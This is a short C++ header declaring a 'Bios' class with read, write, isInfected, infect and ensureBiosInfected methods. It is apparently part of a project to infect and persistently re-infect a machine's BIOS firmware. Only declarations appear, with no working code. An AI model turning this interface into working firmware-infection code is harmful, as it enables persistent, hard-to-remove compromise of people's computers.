#ifndef BIOS_HPP_
#define BIOS_HPP_

#include "logs/Log.hpp"

class Bios {
private:
	Log * pLog;
public:
	Bios(Log * pLog);
	void read();
	void write();
	bool isInfected();
	void infect();
	void ensureBiosInfected();
};

#endif /* BIOS_HPP_ */
